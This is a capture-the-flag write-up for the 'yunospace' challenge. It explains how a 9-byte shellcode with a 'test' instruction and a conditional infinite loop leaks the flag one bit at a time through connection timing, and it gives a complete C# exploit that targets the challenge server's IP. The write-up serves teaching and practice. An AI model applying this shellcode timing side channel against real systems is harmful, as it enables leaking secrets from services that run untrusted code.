# yunospace

When you connect to the service, the python wrapper reads a number number from you and passes the n-th char of the flag to the yunospace binary:

```python
#!/usr/bin/python3 -u

import sys, os, base64

FLAG = "hxp{find_the_flag_on_the_server_here}"

print(" y-u-no-sp                ")
print("XXXXXXXXx.a               ")
print("OOOOOOOOO|                ")
print("OOOOOOOOO| c              ")
print("OOOOOOOOO|                ")
print("OOOOOOOOO|                ")
print("OOOOOOOOO| e              ")
print("~~~~~~~|\~~~~~~~\o/~~~~~~~")
print("   }=:___'>             \n")

print("> Welcome. Which byte should we prepare for you today?")

try:
    n = int(sys.stdin.readline())
except:
    print("> I did not get what you mean, sorry.")
    sys.exit(-1)

if n >= len(FLAG):
    print("> That's beyond my capabilities. Goodbye.")
    sys.exit(-1)

print("> Ok. Now your shellcode, please.")

os.execve("./yunospace", ["./yunospace", FLAG[n]], dict())
```

The yunospace binary was small and simple: All it did was reading 9 bytes from stdin, writing the passed char behind the 9 read bytes, setting all registers to 0, and jumping there.

Since 9 bytes are (as far as we know) not enough to spawn a shell or to execute a write syscall with the appropriate parameters, we decided to use a side channel attack: Depending on the passed char our bytecode has to terminate (and a segfault is a termination), or loop forever. A quick test shows us that if the program segfaults the socket is closed after <2s, and if it loops the socket is closed after >2s.


An infinite loop depending on a flag takes up two bytes:
```
74 fe                   je     7 <loop> 
```
So we have 7 bytes remaining to set a flag depending on the 10th byte and the operation. `test` seems like the best idea (`test` performs a binary `AND` on two operands, and upates `ZF`), because we can identify the byte with 8 requests: By testing the unknown byte with 1 << x (for x in {0, .., 7}) we get a set zero flag if and only if the x-th bit of the byte is set to zero! :tada:

So the exploit is quite simple. Send these bytes, and observe whether the bits of X are set:
```
0:  f6 05 02 00 00 00 X    test   BYTE PTR [rip+0x2], X       # 9 <loop+0x2>
0000000000000007 <loop>:
7:  74 fe                   je     7 <loop> 
```

After experiencing problems with pwntools and closed sockets, I had enough and wrote our exploit in c#:
```c#
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace yunospace
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello World!");
            
            for (int i=0;i<100;i++)
            {
                char c = GetChar(i);
                Console.Write($"{c}");
                Console.Out.Flush();
                if (c == '}')
                {
                    break;
                }
            }
            Console.WriteLine("\ndone.");
            Console.ReadKey();
        }

        static char GetChar(int count)
        {
            var tasks = new List<Task<long>>();
            for (int i = 0; i < 8; i++)
            {
                var x = i;
                tasks.Add(Task.Run(async () =>
                {
                    return await Test(x, count);
                }));
            }
            byte b = 0;
            Task.WhenAll(tasks).Wait();
            for (int i = 0; i < tasks.Count; i++)
            {
                if (tasks[i].Result < 2000)
                    b |= (byte)(0x1 << i);
            }
            return (char)b;
        }

        static async Task<long> Test(int one, int count)
        {
            Stopwatch stopWatch = new Stopwatch();
            try
            {
                byte[] buf = new byte[4048];
                TcpClient client = new TcpClient("195.201.127.119", 8664);
                using (StreamReader sr = new StreamReader(client.GetStream()))
                {
                    await ReadOrThrow(sr);
                    await ReadOrThrow(sr);
                    await ReadOrThrow(sr);
                    await ReadOrThrow(sr);
                    await ReadOrThrow(sr);
                    await ReadOrThrow(sr);
                    await ReadOrThrow(sr);
                    await ReadOrThrow(sr);
                    await ReadOrThrow(sr);
                    await ReadOrThrow(sr);

                    client.GetStream().Write(Encoding.ASCII.GetBytes($"{count}\n"));
                    await ReadOrThrow(sr);

                    stopWatch.Start();
                    byte b = 0x01;
                    b <<= one;
                    client.GetStream().Write(new byte[] { 0xF6, 0x05, 0x02, 0x00, 0x00, 0x00, b, 0x74, 0xFE });
                    await ReadOrThrow(sr);
                    await ReadOrThrow(sr);
                    await ReadOrThrow(sr);
                    await ReadOrThrow(sr);
                }
            }
            catch (Exception e)
            {
            }
            stopWatch.Stop();
            return stopWatch.ElapsedMilliseconds;
        }

        static async Task ReadOrThrow(StreamReader sr)
        {
            var line =  await sr.ReadLineAsync();
            if (line == null)
                throw new IOException();
        }
    }
}
```

